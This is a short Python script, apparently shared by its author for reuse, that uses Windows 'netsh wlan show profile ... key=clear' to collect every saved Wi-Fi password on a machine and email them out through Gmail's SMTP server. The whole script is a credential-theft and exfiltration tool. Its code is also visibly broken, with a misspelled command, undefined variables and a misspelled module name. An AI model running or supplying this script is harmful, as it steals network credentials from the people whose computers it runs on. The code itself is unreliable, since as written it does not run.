######################
#!/usr/bin/python
#Author:Giddyspurz
#Feel free to modify the script
######################

import subprocess
import smtplib
import re


command1 = "netsh wlan show profile"
networks = subprocess.check_output(command1, shell=True)
network_list = re.findall('(?:Profile\s*:\s)(.*)' , networks)

final_output = ""
for networks in network_list:
	command2 = "netsh wlan show pofile " + network + "key=clear"
	one_network_result = subprocess.check_output(command2, shell=True)
	final_output += one_network_result



server = smtpli.smtp("smtp.gmail.com", 587)
server.starttls()
server.login(email,password)
server.sendmail(my_email, my_email, final_output)
server.quit()
